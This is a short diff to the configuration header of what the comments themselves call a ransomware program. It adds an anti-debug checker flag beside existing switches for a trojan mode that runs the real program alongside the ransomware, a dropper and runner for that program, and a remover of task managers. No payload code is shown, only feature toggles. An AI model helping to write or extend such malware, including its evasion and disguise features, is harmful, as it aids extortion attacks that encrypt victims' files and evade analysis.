@@ -51,6 +51,7 @@
 
 /* enabling features */
 #define DEBUG				true	// enable or disable debug mode (print in console)
+#define ANTIDEBUG			true	// enable or disable anti-debug checker
 #define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
 #define DROPRUN_TROJAN_FILE	false	// enable or disable droppper & runner of the real program in trojan mode
 #define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
